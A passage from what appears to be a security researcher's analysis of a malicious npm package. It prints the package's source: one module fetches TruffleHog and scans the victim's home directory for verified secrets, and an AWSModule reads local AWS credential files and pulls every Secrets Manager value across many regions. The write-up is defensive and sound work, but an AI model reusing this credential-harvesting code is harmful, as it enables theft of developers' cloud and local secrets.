</span></span><span class="line"><span class="cl">            <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">downloadFile</span><span class="p">(</span><span class="n">release</span><span class="o">.</span><span class="n">downloadUrl</span><span class="p">,</span> <span class="n">archivePath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">extractBinary</span><span class="p">(</span><span class="n">archivePath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;TruffleHog installation failed:&#34;</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">getVersion</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span><span class="p">)</span> <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">execSync</span><span class="p">(</span><span class="err">`</span><span class="s2">&#34;${this.binaryPath}&#34;</span> <span class="o">--</span><span class="n">version</span><span class="err">`</span><span class="p">,</span> <span class="p">{</span><span class="n">encoding</span><span class="p">:</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span> <span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;pipe&#34;</span><span class="p">})</span><span class="o">.</span><span class="n">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">!!</span><span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">||</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">install</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">getBinaryPath</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">isInstalled</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">getSupportedPlatform</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">platform</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">mapPlatform</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">platform</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">architecture</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">mapArchitecture</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">systemInfo</span><span class="o">.</span><span class="n">architecture</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">scanFilesystem</span><span class="p">(</span><span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">90000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="n">Promise</span><span class="p">((</span><span class="n">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">startTime</span> <span class="o">=</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">stdout</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">stderr</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">timedOut</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">resolved</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">safeResolve</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">resolved</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">resolved</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">resolve</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">||</span> <span class="o">!</span><span class="n">fs</span><span class="o">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">safeResolve</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                    <span class="n">success</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">error</span><span class="p">:</span> <span class="s2">&#34;TruffleHog binary not available&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">executionTime</span><span class="p">:</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;filesystem&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="s2">&#34;--json&#34;</span><span class="p">,</span> <span class="s2">&#34;--results=verified&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">const</span> <span class="n">process</span> <span class="o">=</span> <span class="n">spawn</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cwd</span><span class="p">:</span> <span class="n">homedir</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">env</span><span class="p">:</span> <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">stdio</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;pipe&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">const</span> <span class="n">timeoutId</span> <span class="o">=</span> <span class="n">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">timedOut</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">process</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="s2">&#34;SIGTERM&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">process</span><span class="o">.</span><span class="n">killed</span><span class="p">)</span> <span class="n">process</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="s2">&#34;SIGKILL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="n">safeResolve</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                            <span class="n">success</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">output</span><span class="p">:</span> <span class="n">stdout</span><span class="o">.</span><span class="n">trim</span><span class="p">()</span> <span class="o">||</span> <span class="n">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">error</span><span class="p">:</span> <span class="err">`</span><span class="n">Process</span> <span class="n">terminated</span> <span class="n">after</span> <span class="o">$</span><span class="p">{</span><span class="n">timeout</span><span class="p">}</span><span class="n">ms</span> <span class="n">timeout</span><span class="err">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">executionTime</span><span class="p">:</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span>
</span></span><span class="line"><span class="cl">                        <span class="p">});</span>
</span></span><span class="line"><span class="cl">                    <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">},</span> <span class="n">timeout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">process</span><span class="o">.</span><span class="n">stdout</span><span class="err">?</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">stdout</span> <span class="o">+=</span> <span class="n">data</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">process</span><span class="o">.</span><span class="n">stderr</span><span class="err">?</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">stderr</span> <span class="o">+=</span> <span class="n">data</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">process</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clearTimeout</span><span class="p">(</span><span class="n">timeoutId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">const</span> <span class="n">executionTime</span> <span class="o">=</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="n">fs</span><span class="o">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">fs</span><span class="o">.</span><span class="n">unlinkSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                            <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">timedOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">safeResolve</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                            <span class="n">success</span><span class="p">:</span> <span class="n">code</span> <span class="o">===</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">output</span><span class="p">:</span> <span class="n">stdout</span><span class="o">.</span><span class="n">trim</span><span class="p">()</span> <span class="o">||</span> <span class="n">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">error</span><span class="p">:</span> <span class="n">code</span> <span class="o">!==</span> <span class="mi">0</span> <span class="err">?</span> <span class="n">stderr</span> <span class="o">||</span> <span class="err">`</span><span class="n">Process</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="o">$</span><span class="p">{</span><span class="n">code</span><span class="p">}</span><span class="err">`</span> <span class="p">:</span> <span class="n">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">executionTime</span><span class="p">:</span> <span class="n">executionTime</span>
</span></span><span class="line"><span class="cl">                        <span class="p">});</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">process</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clearTimeout</span><span class="p">(</span><span class="n">timeoutId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">const</span> <span class="n">executionTime</span> <span class="o">=</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="n">fs</span><span class="o">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">fs</span><span class="o">.</span><span class="n">unlinkSync</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">binaryPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                            <span class="n">this</span><span class="o">.</span><span class="n">installedStatus</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">safeResolve</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                        <span class="n">success</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">error</span><span class="p">:</span> <span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">start</span> <span class="n">process</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="o">.</span><span class="n">message</span><span class="p">}</span><span class="err">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">executionTime</span><span class="p">:</span> <span class="n">executionTime</span>
</span></span><span class="line"><span class="cl">                    <span class="p">});</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">safeResolve</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                    <span class="n">success</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">error</span><span class="p">:</span> <span class="err">`</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">spawn</span> <span class="n">process</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">error</span><span class="p">}</span><span class="err">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">executionTime</span><span class="p">:</span> <span class="n">Date</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="awsmodule">AWSModule</h5>
<p>The AWSModule contains an interesting variable that defines a specific set of AWS regions to be used during its execution:
<img src="/static/NPM/image-17.png" alt="drawing" width="1000"/></p>
<p>The principal functions called from its main() method are isValid() and getAllSecretValues().</p>
<img src="/static/NPM/image-18.png" alt="drawing" width="1000"/>
<p>The initialize() and parseAwsProfiles() functions begin the enumeration and access process. They locate the .aws/credentials and .aws/config files and proceed to extract the profiles configured within them.</p>
<img src="/static/NPM/image-19.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-16.png" alt="drawing" width="1000"/>
<p>The getAllSecretValues() function starts by enumerating secrets. It creates a Secrets Manager client for each predefined region using the getSecretsClient() helper function and lists all available secrets using the ListSecretsCommand.</p>
<img src="/static/NPM/image-20.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-21.png" alt="drawing" width="1000"/>
<p>Then proceeds to retrieve the value of each secret using the GetSecretValueCommand.</p>
<img src="/static/NPM/image-22.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">class</span> <span class="n">AWSModule</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">stsClient</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">secretsClients</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">callerIdentity</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">profile</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">REGIONS</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;us-east-1&#34;</span><span class="p">,</span> <span class="s2">&#34;us-east-2&#34;</span><span class="p">,</span> <span class="s2">&#34;us-west-1&#34;</span><span class="p">,</span> <span class="s2">&#34;us-west-2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;eu-west-1&#34;</span><span class="p">,</span> <span class="s2">&#34;eu-west-2&#34;</span><span class="p">,</span> <span class="s2">&#34;eu-west-3&#34;</span><span class="p">,</span> <span class="s2">&#34;eu-central-1&#34;</span><span class="p">,</span> <span class="s2">&#34;eu-north-1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ap-southeast-1&#34;</span><span class="p">,</span> <span class="s2">&#34;ap-southeast-2&#34;</span><span class="p">,</span> <span class="s2">&#34;ap-northeast-1&#34;</span><span class="p">,</span> <span class="s2">&#34;ap-northeast-2&#34;</span><span class="p">,</span> <span class="s2">&#34;ap-south-1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">parseAwsProfiles</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">profiles</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">configPaths</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="n">join</span><span class="p">(</span><span class="n">homedir</span><span class="p">(),</span> <span class="s2">&#34;.aws&#34;</span><span class="p">,</span> <span class="s2">&#34;credentials&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="n">join</span><span class="p">(</span><span class="n">homedir</span><span class="p">(),</span> <span class="s2">&#34;.aws&#34;</span><span class="p">,</span> <span class="s2">&#34;config&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">configPath</span> <span class="n">of</span> <span class="n">configPaths</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">existsSync</span><span class="p">(</span><span class="n">configPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">content</span> <span class="o">=</span> <span class="n">readFileSync</span><span class="p">(</span><span class="n">configPath</span><span class="p">,</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">);</span>
